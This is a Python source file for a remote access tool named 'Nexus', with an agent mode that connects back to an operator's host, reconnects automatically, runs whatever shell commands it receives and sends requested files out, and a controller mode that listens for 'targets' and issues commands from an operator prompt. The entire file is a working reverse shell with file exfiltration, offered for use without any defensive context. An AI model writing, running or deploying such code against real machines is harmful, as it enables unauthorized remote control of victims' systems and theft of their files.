import socket
import subprocess
import os
import struct
import time
import sys

def run_agent(host, port):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((host, port))
            while True:
                command = s.recv(8192).decode('utf-8', errors='ignore')
                if not command:
                    break
                
                cmd_parts = command.strip().split(' ', 1)
                action = cmd_parts[0].lower()
                
                if action == 'exit':
                    break
                
                elif action == 'cd':
                    try:
                        target_dir = cmd_parts[1] if len(cmd_parts) > 1 else os.path.expanduser('~')
                        os.chdir(target_dir)
                        s.send(f"[+] Active Directory: {os.getcwd()}".encode('utf-8'))
                    except Exception as e:
                        s.send(str(e).encode('utf-8'))
                
                elif action == 'download':
                    filepath = cmd_parts[1].strip() if len(cmd_parts) > 1 else ''
                    if os.path.exists(filepath):
                        filesize = os.path.getsize(filepath)
                        s.sendall(struct.pack('>I', filesize))
                        with open(filepath, 'rb') as f:
                            while chunk := f.read(8192):
                                s.sendall(chunk)
                    else:
                        s.send(struct.pack('>I', 0))
                
                else:
                    output = subprocess.getoutput(command)
                    if not output:
                        output = "[+] Executed successfully with zero output."
                    s.send(output.encode('utf-8'))
        except Exception:
            time.sleep(5)  # إعادة اتصال تلقائية عند انقطاع الشبكة
        finally:
            s.close()

def run_master(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(1)
    
    print(f"[*] Nexus Listener active on port {port}. Awaiting incoming connection...")
    conn, addr = server.accept()
    print(f"[+] Target acquired: {addr[0]}:{addr[1]}")
    
    try:
        while True:
            cmd = input("Operator@Nexus:~# ")
            if not cmd.strip():
                continue
            
            if cmd.lower() == 'exit':
                conn.send(b'exit')
                break
            
            conn.send(cmd.encode('utf-8'))
            
            if cmd.startswith('download '):
                raw_size = conn.recv(4)
                if not raw_size:
                    print("[-] Connection lost.")
                    break
                size = struct.unpack('>I', raw_size)[0]
                if size == 0:
                    print("[-] Target file not found or inaccessible.")
                    continue
                
                filename = cmd.split()[1].split('/')[-1]
                received = 0
                with open(filename, 'wb') as f:
                    while received < size:
                        chunk = conn.recv(min(8192, size - received))
                        if not chunk:
                            break
                        f.write(chunk)
                        received += len(chunk)
                print(f"[+] File transferred -> {filename} ({size} bytes)")
            
            else:
                response = conn.recv(65536).decode('utf-8', errors='ignore')
                print(response)
                
    except Exception as e:
        print(f"[-] Critical Error: {e}")
    finally:
        conn.close()
        server.close()
        print("[*] Session terminated.")

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == '--master':
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 7777
        run_master(port)
    elif len(sys.argv) > 2 and sys.argv[1] == '--agent':
        host = sys.argv[2]
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 7777
        run_agent(host, port)
    else:
        print("[-] Usage Guidelines:")
        print("  [Controller Mode]: python nexus.py --master [PORT]")
        print("  [Agent Mode]:      python nexus.py --agent [SERVER_IP] [PORT]")



